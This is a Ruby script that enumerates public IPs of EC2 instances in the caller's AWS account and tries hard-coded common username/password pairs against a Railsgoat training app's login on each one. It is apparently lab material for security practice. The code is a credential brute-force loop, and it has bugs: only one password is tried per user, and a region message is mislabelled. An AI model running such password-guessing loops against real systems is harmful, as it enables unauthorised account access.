#! /bin/ruby
require 'net/ssh'
require 'net/http'
require 'aws-sdk'


if ENV['AWS_PROFILE']
  puts "Using AWS_PROFILE = #{ENV['AWS_PROFILE']}"
else
  puts "AWS_PROFILE is empty, using 'default'"
end
profile = ENV['AWS_PROFILE']

credentials = Aws::SharedCredentials.new(profile_name: ENV['AWS_PROFILE'])

if ENV['AWS_REGION']
  puts "Using AWS_REGION = #{ENV['AWS_REGION']}"
else
  puts "AWS_PROFILE is empty, using default 'us-west-2'"
end
region = ENV['AWS_REGION'] || 'us-west-2'

client = Aws::EC2::Client.new(region: region, credentials: credentials)
ec2_resp = client.describe_instances
reservations = ec2_resp.reservations
public_ips = []

reservations.each do |reservation|
  reservation.instances.each do |ec2|
    public_ips << ec2.public_ip_address
  end
end

usernames=["ec2-user","admin","username","johntheripper","master","hacker","admin@metacorp.com"]
passwords=["ec2-user","admin","password","johntheripper","master","letmein","admin1234"]


# Attempt brute force Railsgoat user sign in #

public_ips.each do |public_ip|

  usernames.each do |username|
    i = 0
    hostname = public_ip
    username = username
    password = passwords[i]
    port = 8080
    time_out_limit = 1

    begin
      uri = URI("http://#{hostname}:#{port}/sessions")
      req = Net::HTTP::Post.new(uri)
      req.set_form_data('email' => username, 'password' => password, 'commit' => 'Login')
      http = Net::HTTP.new(uri.hostname, uri.port)
      http.open_timeout = time_out_limit
      http.read_timeout = time_out_limit
      res = http.request(req)

      case res
      when Net::HTTPSuccess then
        if res.body.include?("Incorrect Password") || res.body.include?("doesn't exist!")
          puts "FAIL: Railsgoat Login Failed"
        end
      when Net::HTTPRedirection then
        location = res['location']
        if location.include?("/dashboard/home")
          puts "SUCCESS: Railsgoat Login Success! Redirected to #{location}"
        else
          puts "FAIL: Redirected to #{location}"
        end
      else
        puts "FAIL: No Railsgoat server"
      end

    rescue Net::OpenTimeout => e
     puts "FAIL: TIMED OUT after #{time_out_limit} seconds. No Railsgoat server"
    end
    i += 1
  end
end
